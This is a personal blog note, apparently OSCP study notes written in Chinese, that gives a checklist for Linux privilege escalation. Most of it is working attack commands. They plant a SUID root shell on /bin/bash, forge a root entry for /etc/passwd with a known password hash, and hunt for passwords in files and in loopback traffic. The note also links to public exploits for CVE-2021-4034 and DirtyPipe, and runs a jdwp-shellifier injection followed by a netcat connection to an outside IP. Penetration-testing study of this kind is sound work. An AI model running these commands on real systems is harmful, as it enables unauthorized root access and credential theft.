+++
ShowToc = true
TocOpen = true
title = 'Linux 提权'
date = 2024-10-11T14:25:59+08:00
draft = false
private = true
show_reading_time = true
categories = 'OSCP笔记'
+++


添加路由：
sudo route add -net 192.168.245.1 netmask 255.255.255.0 gw 192.168.45.254
sudo route add -net <目标网络> netmask <掩码> gw <网关地址>

有gcc先考虑内核提权，存在少量情况是没有GCC，交叉编译；


```
chmod u+s /bin/bash
/bin/bash -p 
```

# 提权手动，千万注意细节，文件、计划任务特殊、进程

1、SUID：

```
find / -perm -u=s -type f 2>/dev/null
类似效果
/usr/sbin/getcap -r / 2>/dev/null
```

2、交互式shell:

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

3、/etc/crontab ！！！ 手动检查


ls -lah /etc/cron*

重点看**小时**和**cron.d**


4、sudo -l

5、数据库账密信息

6、家目录文件

7、文件可写：

```
/etc/passwd
/etc/shadow
/etc/sudoers
```

8、内核信息：

```
uname -a    ##打印所有可用的系统信息
uname -r    ##内核版本
uname -n    ##系统主机名。
uname -m    ##查看系统内核架构（64位/32位）
hostname    ##系统主机名
cat /proc/version    ##内核信息
cat /etc/*-release   ##分发信息
cat /etc/issue       ##分发信息
cat /proc/cpuinfo    ##CPU信息
cat /etc/lsb-release   ##Debian 
cat /etc/redhat-release  ##Redhat
ls /boot | grep vmlinuz-


常用方法：
1、确认内核版本：
cat /etc/issue 发行版
uname -r 内核
arch 架构

2、筛选：
searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation"   | grep  "4." | grep -v " < 4.4.0" | grep -v "4.8"

```

9、.bashrc

```
env
cat .bashrc

```

10、进程监控

```
watch -n 1 "ps -aux | grep pass"

sudo tcpdump -i lo -A | grep "pass"
```

11、系统日志查计划任务

```
grep "CRON" /var/log/syslog
```

**12、备份文件**

特别是一些目录下的：var、opt、tmp 

13、端口，不对外开放的那种

目前可能存在web高权限、java调试应用等

14、当前权限用户家目录
## 常用技巧

查找doas相关的文件：
```
find / -name *local.txt* -type f 2>/dev/null
```

查找内容中带有pass的文件：

```
grep -R -i pass /home/* 2>/dev/null
```

查找某个用户的文件：

```
find / -type f -user delx 2>/dev/null
```

查看程序内容：
```
strings xxx
```

生成passwd密码：
```
openssl passwd -1

$1$8PxO.i7T$aDaohw/CLzjdaIOK8BrDy1

root:$1$ZytY2Uoj$1.aU20M/0/xD4Wo1ymW9Z0:0:0:root:/root:/bin/bash  #Abcd1234
```

辅助脚本


```
https://pentestmonkey.net/tools/audit/unix-privesc-check

https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
```

# 2021-4034

带有polkit可尝试

```
https://github.com/dzonerzy/poc-cve-2021-4034/releases/tag/v0.2
```


# DirtyPipe

```
https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit/blob/main/exploit.c
```



![](/oscp_img/Pasted%20image%2020240327161524.png)


# jdwp-shellifier java 提权

```
proxychains4 python jdwp-shellifier.py -t 127.0.0.1 -p 8000 --break-on 'java.lang.String.indexOf' -c 'chmod u+s /bin/bash

nc 192.168.224.150 5000
```